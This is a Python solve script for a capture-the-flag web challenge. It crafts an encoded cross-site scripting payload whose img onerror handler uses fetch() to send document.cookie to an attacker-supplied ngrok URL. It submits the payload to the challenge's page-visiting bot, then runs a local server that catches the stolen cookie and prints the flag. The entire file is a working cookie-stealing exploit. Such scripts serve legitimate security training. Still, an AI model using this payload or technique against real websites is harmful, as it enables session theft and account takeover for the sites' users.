#!/usr/bin/env python3
import re
import requests
import sys
import http.server
import threading
import urllib.parse


session_cookie_name = 'FLAG'
flag_re = 'SECT{.*}'


class GetHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if re.findall(flag_re, self.path):
            print("Flag:", re.findall(flag_re, self.path)[0])
            exit(0)
        print(self.path)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'thx for visiting')


def start_server():
    server_address = ('localhost', 8000)
    httpd = http.server.HTTPServer(server_address, GetHandler)
    httpd.serve_forever()


def gen_payload(url):
    url = urllib.parse.quote(url)
    return f"http://thesanitizationstation-1.play.hackaplaneten.se:8001/?user_input=%F0%9F%92%8Bimg%20src%3Dx%20onerror%3Dfetch(%27{url}%2F%3Fc%3D%27%252Bdocument.cookie)%2F%2F%F0%9F%92%9B"


if __name__ == '__main__':
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <ngrok-url> <challenge-url>")
        exit(-1)

    ngrok_url = sys.argv[1]
    challenge_url = sys.argv[2]

    s = requests.Session()

    print("Sending payload...")
    payload = gen_payload(ngrok_url)
    data = {
        'url': payload
    }
    s.post(challenge_url + '/api/visit', data=data)

    print("Starting server...")
    thread = threading.Thread(target=start_server)
    thread.daemon = True
    thread.start()
    print('Server started.')

    while thread.is_alive():
        pass
